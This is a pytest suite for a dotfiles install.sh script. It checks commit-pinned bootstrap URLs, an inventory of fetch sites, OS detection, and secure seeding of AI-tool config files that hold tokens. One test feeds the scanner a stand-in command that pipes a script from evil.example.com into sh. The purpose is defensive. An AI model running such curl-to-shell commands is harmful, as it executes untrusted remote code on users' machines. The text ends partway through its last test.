"""Tests for install.sh (sourced; main() is guarded and never runs here)."""

import json
import os
import re
import shlex
import shutil
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest
from conftest import REPO_ROOT

INSTALL = REPO_ROOT / "install.sh"


def run_sourced(snippet: str, env: dict, cwd=None):
    script = f'source "{INSTALL}"\n{snippet}\n'
    return subprocess.run(
        ["bash", "-c", script],
        capture_output=True,
        text=True,
        env=env,
        cwd=cwd,
        timeout=120,
    )


# Appended to a snippet to read INSTALL_FAILURES back out of the shell: an `N=`
# line with the count and one `F=` line per label, in order. Indexing in a loop
# (not `printf '%s\n' "${a[@]}"`) so an empty array prints nothing instead of a
# blank line, and a label with spaces or quotes survives as one entry.
_DUMP_FAILURES = (
    'echo "N=${#INSTALL_FAILURES[@]}"; i=0; '
    'while [ "$i" -lt "${#INSTALL_FAILURES[@]}" ]; do '
    'echo "F=${INSTALL_FAILURES[$i]}"; i=$((i + 1)); done'
)


def run_recording(snippet: str, env: dict, cwd=None):
    """Run `snippet`, then dump INSTALL_FAILURES; return (result, labels).

    Fails loudly when the dump never ran (the snippet aborted under `set -e`):
    an empty `labels` must mean "nothing was recorded", not "we never got to
    look".
    """
    res = run_sourced(f"{snippet}\n{_DUMP_FAILURES}", env, cwd=cwd)
    lines = res.stdout.splitlines()
    counts = [ln for ln in lines if ln.startswith("N=")]
    assert counts, f"the snippet aborted before the dump:\n{res.stdout}\n{res.stderr}"
    labels = [ln[2:] for ln in lines if ln.startswith("F=")]
    assert counts[-1] == f"N={len(labels)}", (counts, labels)
    return res, labels


# Never stripped by _without_commands: these carry core utilities
# (dirname, touch, sudo, curl, sed, cmp, mktemp, ...) and, for /bin on this
# platform, bash itself. Some dev-machine tools (pip3, vim, zsh) have a
# second copy living in one of these -- e.g. Apple ships /bin/zsh and
# /usr/bin/vim/pip3 alongside the homebrew/pyenv ones -- so blindly
# removing the owning directory for every match can silently take PATH
# lookups (or the bash subprocess itself) down with it.
_PROTECTED_PATH_DIRS = {"/bin", "/usr/bin", "/sbin", "/usr/sbin"}


def _without_commands(env: dict, *names: str) -> dict:
    """Strip real PATH directories that would resolve any of `names`.

    Several tools under test (go, glow, staticcheck, ...) are genuinely
    installed on a developer workstation, so a bare `command -v` check
    would find the real one and mask the very "not installed" branch a
    test wants to exercise. Removing the owning directory makes absence
    real rather than a stubbed override. Stops at a protected system
    directory instead of removing it (see _PROTECTED_PATH_DIRS) -- a
    command with a surviving copy there needs a function-shadow instead
    (see TestChangeShell / TestInstallVimPlugins for zsh/vim).
    """
    env = dict(env)
    for name in names:
        while True:
            found = shutil.which(name, path=env["PATH"])
            if not found:
                break
            parent = Path(found).parent
            if parent.name == "stub-bin":
                # The shared stub dir (which carries backstop stubs for
                # system-mutating tools) must not be dropped wholesale — that
                # would silently discard every other stub the test set up.
                # Delete just this stub to make the tool absent.
                Path(found).unlink()
                continue
            drop = str(parent)
            if drop in _PROTECTED_PATH_DIRS:
                break
            env["PATH"] = ":".join(p for p in env["PATH"].split(":") if p != drop)
    return env


def _pin(var: str) -> str:
    """The value install.sh assigns to the top-level pin variable `var`."""
    m = re.search(rf'^{var}="([^"]*)"', INSTALL.read_text(encoding="utf-8"), re.M)
    assert m, f"{var} is not defined in install.sh"
    return m.group(1)


def _executable_lines(text: str) -> str:
    return "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))


def _gpg_shows(*fprs: str) -> str:
    """Stub body: `gpg ... --show-keys` lists one primary key per fingerprint
    (each with a subkey, whose fingerprint must not be mistaken for it)."""
    rows = []
    for fpr in fprs:
        rows += [
            f"pub:-:4096:1:{fpr[-16:]}:1487788586:::-:::scESC::::::23::0:",
            f"fpr:::::::::{fpr}:",
            "sub:-:4096:1:7EA0A9C3F273FCD8:1487788586::::::s::::::23:",
            "fpr:::::::::D3306A018370199E527AE7997EA0A9C3F273FCD8:",
        ]
    quoted = " ".join(shlex.quote(r) for r in rows)
    return f'case " $* " in *" --show-keys "*) printf \'%s\\n\' {quoted} ;; esac'


# Stub prefix for sudo: record what each `sudo tee FILE` would have written.
_SUDO_TEE_LOG = (
    'case "$*" in "tee "*) { echo "## $*"; cat; } >>"$HOME/tee.log" ;; esac\n'
)

_OTHER_FPR = "0123456789ABCDEF0123456789ABCDEF01234567"


def _os_release(*lines: str) -> str:
    """Snippet prefix pointing OS_RELEASE_FILE at a file with `lines`."""
    body = "\\n".join(lines)
    return (
        f"printf '{body}\\n' >\"$HOME/os-release\"; "
        'OS_RELEASE_FILE="$HOME/os-release"; '
    )


_UBUNTU_NOBLE = _os_release(
    "ID=ubuntu", "VERSION_CODENAME=noble", "UBUNTU_CODENAME=noble"
)


_DD_ABSENT = 'DOCKER_DESKTOP_APP="$HOME/no-such-Docker.app"; '


def _brew_casks(*installed: str) -> str:
    """brew stub: `list --cask X` succeeds for `installed` and for any cask a
    previous `install --cask X` put in place; every other `list` fails."""
    known = " ".join(installed)
    return (
        'state="$HOME/.brew-casks"\n'
        'case "$1 $2" in\n'
        '  "list --cask") for c in ' + known + ' $(cat "$state" 2>/dev/null); do\n'
        '      [ "$c" = "$3" ] && exit 0; done; exit 1 ;;\n'
        '  "install --cask") echo "$3" >>"$state"; exit 0 ;;\n'
        "esac\n"
        '[ "$1" = list ] && exit 1\n'
        "exit 0"
    )


class TestSourceGuard:
    def test_sourcing_does_not_run_main(self, shell_env):
        res = run_sourced("true", shell_env.env)
        assert res.returncode == 0
        assert res.stdout == ""

    def test_piped_execution_outside_checkout_fails_with_guidance(
        self, shell_env, tmp_path
    ):
        # `cat install.sh | bash` from a non-checkout dir must still reach
        # main() and fail fast with the clone-the-repo error (exit 1),
        # before any package installation is attempted.
        outside = tmp_path / "not-a-checkout"
        outside.mkdir()
        res = subprocess.run(
            ["bash"],
            input=INSTALL.read_text(encoding="utf-8"),
            capture_output=True,
            text=True,
            env=shell_env.env,
            cwd=outside,
            timeout=60,
        )
        assert res.returncode == 1
        assert "Dotfiles repository not found" in res.stdout


class TestPinnedUpstreamRefs:
    """Bootstrap scripts fetched from GitHub must name an immutable commit.

    A raw.githubusercontent.com URL on HEAD/master executes whatever is there
    at run time, so the bytes handed to a shell (twice, to root) can change
    between two runs with no signal. A commit SHA already identifies its
    content cryptographically, which is why pinning the ref is enough and no
    separate checksum table is kept. These tests fail if a pin is ever reverted
    to a branch -- the drift would otherwise be invisible.
    """

    GITHUB_RAW = re.compile(
        r"https://raw\.githubusercontent\.com/[^/\s\"']+/[^/\s\"']+/([^/\s\"']+)/"
    )

    def test_every_github_raw_url_is_pinned_to_a_commit(self):
        text = INSTALL.read_text(encoding="utf-8")
        # Only the URLs actually fetched at run time matter; the refresh
        # recipe in the pin comment names repos, not raw URLs, so it is not
        # matched here.
        for ref in self.GITHUB_RAW.findall(text):
            if ref.startswith("$"):  # interpolated pin variable
                continue
            assert re.fullmatch(r"[0-9a-f]{40}", ref), (
                f"unpinned github raw ref {ref!r} in install.sh: "
                "use a 40-char commit SHA, not a branch"
            )

    @pytest.mark.parametrize(
        "var",
        [
            "HOMEBREW_INSTALL_REF",
            "LAZYDOCKER_INSTALL_REF",
            "OHMYZSH_INSTALL_REF",
            "VIM_PLUG_REF",
        ],
    )
    def test_pin_variable_holds_a_commit_sha(self, var):
        text = INSTALL.read_text(encoding="utf-8")
        match = re.search(rf'^{var}="([^"]*)"', text, re.MULTILINE)
        assert match, f"{var} is not defined in install.sh"
        assert re.fullmatch(r"[0-9a-f]{40}", match.group(1)), (
            f"{var} must be a 40-char commit SHA, got {match.group(1)!r}"
        )

    @pytest.mark.parametrize(
        "var",
        [
            "HOMEBREW_INSTALL_REF",
            "LAZYDOCKER_INSTALL_REF",
            "OHMYZSH_INSTALL_REF",
            "VIM_PLUG_REF",
        ],
    )
    def test_pin_variable_is_actually_used(self, var):
        # A pin nobody interpolates is worse than none: it reads as verified
        # while the fetch still rides a branch.
        text = INSTALL.read_text(encoding="utf-8")
        assert f"${var}/" in text, f"{var} is defined but never used in a URL"


class TestFetchSiteInventory:
    """Enumerate every fetch site in install.sh, not every known threat.

    TestPinnedUpstreamRefs above verifies the pins that exist. It cannot see a
    fetch that was never pinned in the first place, because its regex only
    matches raw.githubusercontent.com. Three `git clone` calls (tpm,
    zsh-autosuggestions, zsh-syntax-highlighting) sit outside both the pin
    policy and its test, and the policy comment at the top of install.sh
    recites a fetch inventory that does not mention any of them. (serena's
    `uvx --from git+https://` used to be the fourth; it is pinned to a commit
    with `@$SERENA_REF` now.)

    This test inverts the direction of enumeration: it starts from every
    https:// URL appearing in an executable (non-comment) line of install.sh
    and requires each one to be classified into exactly one bucket. A fetch
    added tomorrow lands in no bucket and fails here by default -- forcing a
    deliberate decision instead of a silent omission. That is the whole point;
    the buckets below are bookkeeping, the fail-closed default is the guard.

    What this deliberately does NOT cover, so its green is not read as more
    than it is: package-manager installs. `go install <mod>@latest` (the
    install_glow and install_linters_formatters functions in install.sh) and
    `npm install -g <pkg>` do fetch code at a floating version, but their
    registries verify what arrives on their own -- Go checks the module
    against the checksum database, npm against the registry's integrity hash
    -- so the exposure there is a moving version, not unverified bytes. The
    "separate trust paths" note in install.sh's fetch-inventory header
    comment scopes apt out for the same reason. Folding them in would merge
    two different trust models into one bucket and make the result harder to
    reason about, not easier; auditing floating versions is a separate guard,
    not this one.
    """

    # Pins live in these variables; a URL interpolating one is pinned. A bare
    # 40-char SHA path segment counts too, so an inline pin is not a false
    # negative just because it skipped the variable.
    PIN_VARS = (
        "HOMEBREW_INSTALL_REF",
        "LAZYDOCKER_INSTALL_REF",
        "OHMYZSH_INSTALL_REF",
        "VIM_PLUG_REF",
        # pip/uv's `git+URL@REF` form: the pin ends the URL instead of being a
        # path segment, so _is_pinned also accepts a trailing `@$VAR`.
        "SERENA_REF",
    )

    # Fetches deliberately left unpinned, with the reason the "vendor
    # redirectors" paragraph of install.sh's `Pinned upstream bootstrap
    # scripts` header comment gives: these expose no immutable ref, so pinning
    # them would mean a content hash re-pinned on every upstream release.
    UNPINNED_BY_DESIGN = {
        "https://astral.sh/uv/install.sh": "vendor redirector, no immutable ref",
        "https://pyenv.run": "vendor redirector, no immutable ref",
        # apt keyring / repository URLs. The "separate trust paths" note in
        # install.sh's fetch-inventory header comment scopes these out: dearmoring
        # a key or adding a sources.list entry is not the same as executing
        # fetched bytes, and pinning a raw GitHub ref would not address either.
        "https://apt.fury.io/wez/gpg.key": "apt keyring, separate trust path",
        "https://apt.fury.io/wez/": "apt repository, separate trust path",
        "https://cli.github.com/packages/githubcli-archive-keyring.gpg": (
            "apt keyring, separate trust path"
        ),
        "https://cli.github.com/packages": "apt repository, separate trust path",
    }

    # Fetches whose bytes are checked against a value pinned in install.sh
    # before anything trusts them, although the URL itself names no immutable
    # ref: apt keyrings verified against a pinned primary-key fingerprint
    # (_add_signed_apt_repo), the repositories those keyrings sign, and a
    # release binary verified against a pinned sha256 (_install_hadolint_release).
    # These replaced get.docker.com and NodeSource's setup_lts.x, the two
    # scripts that used to be fetched and executed as root.
    VERIFIED_BY_PINNED_DIGEST = {
        "https://download.docker.com/linux/$distro/gpg": (
            "apt keyring, primary key must be DOCKER_APT_KEY_FPR"
        ),
        "https://download.docker.com/linux/$distro": (
            "apt repository signed by that keyring"
        ),
        "https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key": (
            "apt keyring, primary key must be NODESOURCE_APT_KEY_FPR"
        ),
        "https://deb.nodesource.com/node_$NODESOURCE_NODE_MAJOR.x": (
            "apt repository signed by that keyring"
        ),
        "https://github.com/hadolint/hadolint/releases/download/v$HADOLINT_VERSION/$asset": (
            "release binary, must match HADOLINT_SHA256_X86_64 / HADOLINT_SHA256_ARM64"
        ),
    }

    # Unpinned fetches that are NOT a considered decision -- they were simply
    # never counted. Kept separate from UNPINNED_BY_DESIGN on purpose: this
    # bucket is a worklist, not a blessing. Pin an entry (or move it above with
    # a stated reason) and delete it from here; test_open_findings_are_current
    # fails if a listed URL is gone, so the list cannot rot into a fiction.
    UNPINNED_OPEN_FINDINGS = {
        "https://github.com/tmux-plugins/tpm": "git clone of branch HEAD",
        "https://github.com/zsh-users/zsh-autosuggestions": (
            "git clone of branch HEAD; runs on every interactive shell start"
        ),
        "https://github.com/zsh-users/zsh-syntax-highlighting": (
            "git clone of branch HEAD; runs on every interactive shell start"
        ),
    }

    # Editing this set is what makes a change to the open findings visible in
    # review: growing the bucket, or swapping one finding for another without
    # changing the count, both fail here until this literal is edited too.
    # Being honest about its strength -- both sides are hand-maintained in this
    # file, so this is a trip-wire that forces a second deliberate edit, not an
    # independent check. The independent checks are the two above it:
    # test_every_fetch_url_is_classified reads install.sh, and
    # test_listed_urls_are_still_present fails once a listed URL is gone.
    EXPECTED_OPEN_FINDINGS = frozenset(
        {
            "https://github.com/tmux-plugins/tpm",
            "https://github.com/zsh-users/zsh-autosuggestions",
            "https://github.com/zsh-users/zsh-syntax-highlighting",
        }
    )

    # URL-shaped tokens that appear in executable lines but are never fetched:
    # the first two are printed for the user to open by hand, the third is not
    # a URL at all but a printf FORMAT whose %s is a hostname. The scanner
    # matches on shape, so a format string reads as a URL to it; classifying it
    # here is the sanctioned answer (the failure message says so) and keeps the
    # fail-closed default intact for anything genuinely new. Do not "fix" this
    # by rewriting the printf to hide the token -- every spelling that builds an
    # https:// config key looks the same to a shape matcher, and hiding it would
    # only teach the next author to evade the guard.
    NOT_FETCHED = {
        "https://checkstyle.sourceforge.io/",
        "https://github.com/google/google-java-format",
        "https://github.com/tree-sitter/tree-sitter/releases",
        "https://%s",
    }

    # http:// is matched too, so downgrading a fetch to plaintext cannot slip
    # past by falling out of the pattern -- a new http:// URL lands in no
    # bucket and fails, which is the signal worth having.
    #
    # Known scope limits, stated rather than papered over: a URL assembled
    # from variables (`curl "$BASE/x.sh"`), an ssh remote
    # (`git clone git@github.com:o/r`), or a scheme-less host is invisible
    # here. Closing those means parsing shell, and a parser large enough to do
    # it becomes its own bug surface -- the fetches this file actually makes
    # are all literal URLs, and a future one that is not should be caught in
    # review. Revisit if that stops being true.
    URL = re.compile(r"https?://[^\s\"'|)\\]+")

    @classmethod
    def _urls_in_executable_lines(cls, text: str) -> dict[str, int]:
        """Map each https:// URL to the first executable line it appears on.

        Comment-only lines are skipped so the pin-refresh recipe and the policy
        prose in install.sh's `Pinned upstream bootstrap scripts` header
        comment do not register as fetches. Lines with a
        trailing comment are NOT stripped: erring toward including a URL keeps
        this fail-closed, which is the property worth protecting.
        """
        found: dict[str, int] = {}
        for lineno, line in enumerate(text.splitlines(), 1):
            if line.lstrip().startswith("#"):
                continue
            for raw in cls.URL.findall(line):
                found.setdefault(raw.rstrip(".,;"), lineno)
        return found

    @classmethod
    def _is_pinned(cls, url: str) -> bool:
        # Keep a pinned URL on one line. Wrapping one across a `\` continuation
        # truncates the fragment this sees, so the pin stops being recognised
        # and the URL starts failing as unclassified -- a confusing way to
        # learn that reformatting broke nothing real.
        if any(f"${var}/" in url or url.endswith(f"@${var}") for var in cls.PIN_VARS):
            return True
        return bool(re.search(r"/[0-9a-f]{40}(/|$)", url))

    def test_every_fetch_url_is_classified(self):
        found = self._urls_in_executable_lines(INSTALL.read_text(encoding="utf-8"))
        known = (
            set(self.UNPINNED_BY_DESIGN)
            | set(self.VERIFIED_BY_PINNED_DIGEST)
            | set(self.UNPINNED_OPEN_FINDINGS)
            | self.NOT_FETCHED
        )
        unclassified = {
            url: line
            for url, line in found.items()
            if not self._is_pinned(url) and url not in known
        }
        assert not unclassified, (
            "install.sh fetches a URL this inventory does not account for: "
            + ", ".join(
                f"{url} (install.sh:{line})"
                for url, line in sorted(unclassified.items())
            )
            + ". Pin it, or add it to UNPINNED_BY_DESIGN with a reason, or to "
            "NOT_FETCHED if it is only printed."
        )

    def test_open_findings_match_the_reviewed_set(self):
        assert set(self.UNPINNED_OPEN_FINDINGS) == self.EXPECTED_OPEN_FINDINGS, (
            "the open-findings bucket changed; pin the fetch instead of filing it "
            "here if you can, and update EXPECTED_OPEN_FINDINGS deliberately if you cannot"
        )

    @pytest.mark.parametrize(
        "bucket",
        ["UNPINNED_BY_DESIGN", "VERIFIED_BY_PINNED_DIGEST", "UNPINNED_OPEN_FINDINGS"],
    )
    def test_listed_urls_are_still_present(self, bucket):
        # A bucket entry for a URL install.sh no longer fetches reads as a live
        # exception while covering nothing, and hides that the finding was fixed.
        text = INSTALL.read_text(encoding="utf-8")
        for url in getattr(self, bucket):
            assert url in text, (
                f"{bucket} lists {url}, which install.sh no longer references"
            )

    def test_detects_an_unaccounted_fetch(self):
        # The guard has to fail on something it has never seen, or the green
        # above only proves the buckets match today's file.
        snippet = "curl -fsSL https://evil.example.com/x.sh | sh\n# https://commented.example.com\n"
        found = self._urls_in_executable_lines(snippet)
        assert found == {"https://evil.example.com/x.sh": 1}
        assert not self._is_pinned("https://evil.example.com/x.sh")

    def test_recognises_both_pin_forms(self):
        assert self._is_pinned(
            "https://raw.githubusercontent.com/junegunn/vim-plug/$VIM_PLUG_REF/plug.vim"
        )
        assert self._is_pinned("https://example.com/" + "a" * 40 + "/install.sh")
        assert not self._is_pinned("https://example.com/master/install.sh")
        assert self._is_pinned("https://github.com/oraios/serena@$SERENA_REF")
        assert not self._is_pinned("https://github.com/oraios/serena")

    def test_the_digest_bucket_names_pins_install_sh_defines(self):
        # Each reason cites the variable that holds the digest; a reason
        # naming a variable that does not exist is a check that is not made.
        text = INSTALL.read_text(encoding="utf-8")
        cited = []
        for url, reason in self.VERIFIED_BY_PINNED_DIGEST.items():
            for var in re.findall(
                r"\b[A-Z][A-Z0-9_]*_(?:FPR|SHA256_[A-Z0-9_]+)\b", reason
            ):
                cited.append(var)
                assert re.search(rf"^{var}=", text, re.M), (url, var)
        # Not vacuous: both fingerprints and both hadolint digests are named.
        assert len(cited) == 4, cited


class TestDetectOs:
    def test_darwin_is_macos(self, shell_env):
        # OSTYPE を明示して host OS に依存しない（Linux CI 上でも成立させる）
        res = run_sourced('OSTYPE=darwin24 detect_os && echo "OS=$OS"', shell_env.env)
        assert "Detected OS: macos" in res.stdout
        assert "OS=macos" in res.stdout

    def test_linux_gnu_without_debian_marker_is_linux(self, shell_env):
        # debian マーカーを不在パスに差し替え、host に /etc/debian_version が
        # あっても linux 分岐を確定的に検証する
        res = run_sourced(
            "OSTYPE=linux-gnu DEBIAN_VERSION_FILE=/nonexistent "
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=linux" in res.stdout

    def test_linux_gnu_with_debian_marker_is_ubuntu(self, shell_env, tmp_path):
        marker = tmp_path / "debian_version"
        marker.write_text("13\n", encoding="utf-8")
        res = run_sourced(
            f'OSTYPE=linux-gnu DEBIAN_VERSION_FILE="{marker}" '
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=ubuntu" in res.stdout

    def test_msys_is_windows(self, shell_env):
        res = run_sourced('OSTYPE=msys detect_os && echo "OS=$OS"', shell_env.env)
        assert "OS=windows" in res.stdout

    def test_wsl_distro_name_does_not_override_ubuntu_detection(
        self, shell_env, tmp_path
    ):
        # WSL always reports OSTYPE=linux-gnu, so it is caught by the
        # linux-gnu branch (and classified ubuntu/linux there) before the
        # windows branch is ever reached. Setting WSL_DISTRO_NAME must not
        # flip detection to "windows" -- this locks in the "WSL is treated as
        # Ubuntu" behavior.
        marker = tmp_path / "debian_version"
        marker.write_text("13\n", encoding="utf-8")
        res = run_sourced(
            f'OSTYPE=linux-gnu WSL_DISTRO_NAME=Ubuntu DEBIAN_VERSION_FILE="{marker}" '
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=ubuntu" in res.stdout

    def test_unknown_os_fails(self, shell_env):
        res = run_sourced("OSTYPE=solaris detect_os", shell_env.env)
        assert res.returncode == 1
        assert "Unsupported operating system" in res.stdout


class TestCreateSymlinks:
    def test_links_backups_and_copies(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").write_text("old content\n", encoding="utf-8")
        # A stale symlink must be replaced without being backed up.
        (home / ".vimrc").symlink_to("/nonexistent-target")

        # link_oh_my_zsh_theme is split out of create_symlinks (see
        # TestOhMyZshFreshInstallOrdering) and is only called after
        # install_oh_my_zsh in main(); call it explicitly here since this
        # test asserts on the theme symlink it produces.
        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)
        assert res.returncode == 0

        # Top-level dotfiles are symlinked into the repo.
        for name in (".zshrc", ".vimrc", ".tmux.conf", ".gitconfig", ".wezterm.lua"):
            link = home / name
            assert link.is_symlink(), f"{name} should be a symlink"
            assert link.resolve() == (REPO_ROOT / name).resolve()

        # Claude / Gemini entries are symlinked individually.
        assert (home / ".claude/settings.json").is_symlink()
        assert (home / ".claude/hooks").is_symlink()
        # settings.json's CLAUDE_CODE_PLUGIN_DIRS names mods under ~/.claude/mods.
        assert (home / ".claude/mods").is_symlink()
        assert (home / ".claude/mods").resolve() == (
            REPO_ROOT / ".claude/mods"
        ).resolve()
        # ~/.gemini/settings.json is seeded, not linked (see the Gemini tests
        # below); GEMINI.md stays a link.
        assert (home / ".gemini/GEMINI.md").is_symlink()
        assert not (home / ".gemini/settings.json").is_symlink()
        assert (home / ".config/nvim").resolve() == (
            REPO_ROOT / ".config/nvim"
        ).resolve()

        # Codex resolves symlinks when scanning agents/ and skills/, so both
        # are linked as whole directories rather than copied.
        assert (home / ".codex/AGENTS.md").is_symlink()
        assert (home / ".codex/hooks").is_symlink()
        for name in ("agents", "skills"):
            link = home / ".codex" / name
            assert link.is_symlink(), f".codex/{name} should be a symlink"
            assert link.resolve() == (REPO_ROOT / ".codex" / name).resolve()

        # A shared skill resolves through BOTH hops -- the linked skills dir and
        # the repo's own .codex/skills/<name> -> ../../.claude/skills/<name>
        # link -- landing on the single source of truth under .claude/skills.
        skill = home / ".codex/skills/backend-patterns"
        assert skill.is_dir()
        assert (
            skill.resolve() == (REPO_ROOT / ".claude/skills/backend-patterns").resolve()
        )
        assert (skill / "SKILL.md").is_file()

        # Oh My Zsh custom dir stays a REAL directory (install_oh_my_zsh
        # clones plugins into custom/plugins/); only the theme file(s)
        # tracked in the repo are symlinked in.
        assert not (home / ".oh-my-zsh/custom").is_symlink()
        assert (home / ".oh-my-zsh/custom").is_dir()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )
        assert (home / ".tmux/tmux_send_to_all_except_nvim.sh").is_symlink()

        # The pre-existing real .zshrc was backed up; the stale symlink was not.
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        assert (backups[0] / ".zshrc").read_text(encoding="utf-8") == "old content\n"
        assert not (backups[0] / ".vimrc").exists()

    # --- Codex config.toml: seeded, never linked, never clobbered -----------
    # Codex owns this file at runtime: `codex mcp add` writes mcp_servers into
    # it, Authorization headers included, plus projects/ and plugin state. A
    # symlink straight at the checkout would land everything Codex writes in
    # the working tree, one `git add` from committing a token.

    def test_codex_config_is_seeded_as_a_real_file_not_a_symlink(self, shell_env):
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        config = home / ".codex/config.toml"
        assert config.is_file()
        assert not config.is_symlink(), (
            "config.toml must never be a symlink: Codex would write secrets "
            "straight into the checkout"
        )
        assert config.read_text(encoding="utf-8") == (
            REPO_ROOT / ".codex/config.toml.template"
        ).read_text(encoding="utf-8")

    def test_codex_config_written_by_codex_survives_a_rerun(self, shell_env):
        """The whole point: re-rendering would delete the user's MCP servers."""
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        live = home / ".codex/config.toml"
        live.write_text(
            '[mcp_servers.github.http_headers]\nAuthorization = "secret"\n',
            encoding="utf-8",
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        assert 'Authorization = "secret"' in live.read_text(encoding="utf-8")

    def test_codex_config_symlink_is_replaced_with_a_real_file(self, shell_env):
        """Self-heal the older install that linked it into the checkout."""
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/config.toml").symlink_to(
            REPO_ROOT / ".codex/config.toml.template"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        config = home / ".codex/config.toml"
        assert config.is_file()
        assert not config.is_symlink()

    # --- Gemini settings.json: seeded owner-only, never linked ---------------
    # Gemini CLI rewrites ~/.gemini/settings.json (`gemini mcp add`, /auth,
    # /theme) with ${VAR} references such as ${GITHUB_ACCESS_TOKEN} expanded.
    # It writes a temp file at the default mode (0644 under umask 022) and
    # renames it over settings.json, so a symlink becomes a plain world-readable
    # file holding the token, and backup_if_real would then move that file into
    # ~/.dotfiles_backup_*. Because every rewrite resets the file mode, the
    # ~/.gemini directory itself is what keeps others out.

    @staticmethod
    def _mode(path):
        return stat.S_IMODE(path.stat().st_mode)

    def test_gemini_settings_is_seeded_as_an_owner_only_real_file(self, shell_env):
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        settings = home / ".gemini/settings.json"
        assert settings.is_file()
        assert not settings.is_symlink(), (
            "settings.json must not be a symlink: Gemini CLI replaces it with "
            "a plain file holding expanded tokens"
        )
        assert settings.read_text(encoding="utf-8") == (
            REPO_ROOT / ".gemini/settings.json"
        ).read_text(encoding="utf-8")
        assert self._mode(settings) == 0o600
        assert self._mode(home / ".gemini") == 0o700, (
            "Gemini's rewrites reset the file to 0644; only the directory mode "
            "keeps other users out"
        )
        assert not list((home / ".gemini").glob(".settings.json.*")), (
            "the seed's temp file was left behind"
        )

    def test_gemini_settings_written_by_gemini_is_kept_tightened_not_backed_up(
        self, shell_env
    ):
        home = shell_env.home
        (home / ".gemini").mkdir(parents=True)
        (home / ".gemini").chmod(0o755)
        live = home / ".gemini/settings.json"
        live.write_text('{"headers": {"Authorization": "Bearer secret"}}\n')
        live.chmod(0o644)

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert not live.is_symlink()
        assert "Bearer secret" in live.read_text(encoding="utf-8")
        assert self._mode(live) == 0o600
        assert self._mode(home / ".gemini") == 0o700
        for backup in home.glob(".dotfiles_backup_*"):
            assert not (backup / ".gemini/settings.json").exists(), (
                f"a live Gemini settings.json (expanded tokens) was moved into {backup}"
            )

    def test_gemini_settings_symlink_is_replaced_with_a_real_file(
        self, shell_env, tmp_path
    ):
        """Self-heal the older install that linked it into the checkout."""
        home = shell_env.home
        # Link to a copy, not the real checkout: a regression that writes or
        # chmods through the link must not touch the developer's tree.
        old = tmp_path / "old-checkout-settings.json"
        old.write_text('{"old": true}\n', encoding="utf-8")
        old.chmod(0o644)
        (home / ".gemini").mkdir(parents=True)
        (home / ".gemini/settings.json").symlink_to(old)

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        settings = home / ".gemini/settings.json"
        assert settings.is_file()
        assert not settings.is_symlink()
        assert self._mode(settings) == 0o600
        assert settings.read_text(encoding="utf-8") == (
            REPO_ROOT / ".gemini/settings.json"
        ).read_text(encoding="utf-8")
        assert old.read_text(encoding="utf-8") == '{"old": true}\n'
        assert self._mode(old) == 0o644, "the link target was chmodded"

    def test_gemini_settings_dry_run_keeps_a_live_file_untouched(self, shell_env):
        home = shell_env.home
        (home / ".gemini").mkdir(parents=True)
        (home / ".gemini").chmod(0o755)
        live = home / ".gemini/settings.json"
        live.write_text("{}\n", encoding="utf-8")
        live.chmod(0o644)

        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})
        assert res.returncode == 0, res.stderr

        assert live.read_text(encoding="utf-8") == "{}\n"
        assert self._mode(live) == 0o644
        assert self._mode(home / ".gemini") == 0o755
        assert not list(home.glob(".dotfiles_backup_*"))
        plan = [
            ln
            for ln in res.stdout.splitlines()
            if "[DRY-RUN]" in ln and ".gemini" in ln
        ]
        assert any("would keep existing" in ln and "0600" in ln for ln in plan), (
            res.stdout
        )
        assert any("0700" in ln for ln in plan), res.stdout

    def test_gemini_settings_symlink_preview_matches_the_real_seed(
        self, shell_env, tmp_path
    ):
        old = tmp_path / "old-checkout-settings.json"
        old.write_text("{}\n", encoding="utf-8")
        dry_home = tmp_path / "dry-home"
        real_home = tmp_path / "real-home"
        for home in (dry_home, real_home):
            (home / ".gemini").mkdir(parents=True)
            (home / ".gemini/settings.json").symlink_to(old)

        dry = run_sourced(
            "create_symlinks", {**shell_env.env, "HOME": str(dry_home), "DRY_RUN": "1"}
        )
        real = run_sourced("create_symlinks", {**shell_env.env, "HOME": str(real_home)})
        assert dry.returncode == 0, dry.stderr
        assert real.returncode == 0, real.stderr

        dry_plan = [ln for ln in dry.stdout.splitlines() if ".gemini/settings" in ln]
        assert any("would replace" in ln for ln in dry_plan), dry.stdout
        assert any("would seed" in ln for ln in dry_plan), dry.stdout
        assert not any("would keep existing" in ln for ln in dry_plan), dry.stdout
        assert (dry_home / ".gemini/settings.json").readlink() == old
        assert "Seeded ~/.gemini/settings.json" in real.stdout
        assert not (real_home / ".gemini/settings.json").is_symlink()

    def test_gemini_settings_directory_at_dest_is_left_alone(self, shell_env):
        home = shell_env.home
        (home / ".gemini/settings.json").mkdir(parents=True)

        res, failures = run_recording("create_symlinks", shell_env.env)

        assert (home / ".gemini/settings.json").is_dir()
        assert "is a directory" in res.stdout + res.stderr
        # Gemini has no usable settings file, so the run must not end with
        # "Installation completed!".
        assert failures == ["Gemini settings.json"], failures

    def test_gemini_settings_left_in_old_backups_is_restricted(self, shell_env):
        """Older runs moved a token-bearing 0644 copy into the backup dirs."""
        home = shell_env.home
